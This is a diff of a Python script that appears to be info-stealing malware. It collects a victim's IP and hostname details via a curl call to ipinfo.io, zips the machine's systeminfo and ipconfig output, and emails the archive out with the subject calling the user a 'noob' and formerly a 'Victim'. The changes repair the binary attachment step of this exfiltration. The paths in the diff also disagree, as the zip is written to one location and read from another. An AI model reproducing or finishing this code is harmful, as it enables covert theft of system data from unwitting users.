@@ -34,7 +34,7 @@ def sendMail():
 
 
 
-    subject = f"{ipInfo['ip']}'s Victim"
+    subject = f"A new noob is here!"
     #json.dumps(ipInfo)
     message = f'''IP : {ipInfo['ip']}
     Hostname : {ipInfo['hostname']}
@@ -80,23 +80,28 @@ def sendMail():
     msg['Subject'] = subject
 
     # files = ["ipconfig.txt"]
+    msg.attach(MIMEText(message, 'plain', 'utf-8'))
+
+
 
     zipName = f"{str(datetime.datetime.today()).replace(' ', '_').replace(':', '-').split('.')[0]}_{json.loads(os.popen('curl ipinfo.io').read())['ip']}"
     print(zipName)
 
 
-    with ZipFile(f'{pathFolder}{zipName}.zip', 'w') as myzip:
+    with ZipFile(f'{zipName}.zip', 'w') as myzip:
         myzip.write(f'{pathFolder}systeminfo.txt')
         myzip.write(f'{pathFolder}ipconfig.txt')
         myzip.write(f'{pathFolder}readme.txt')
 
-    msg.attach(MIMEText(message, 'plain', 'utf-8'))
-
     filename = f"{pathFolder}{zipName}.zip"
-    f = open(filename)
-    attachment = MIMEText(f.read())
-    attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
-    msg.attach(attachment)
+    with open(filename, 'rb') as fp:
+        bytes = fp.read()
+    # attachment = MIMEText(f.read())
+    # attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
+    # msg.attach(attachment)
+    att = MIMEApplication(bytes, Name=filename)
+    att['Content-Disposition'] = f'attachment; filename="{filename}"'
+    msg.attach(att)
 
 
         
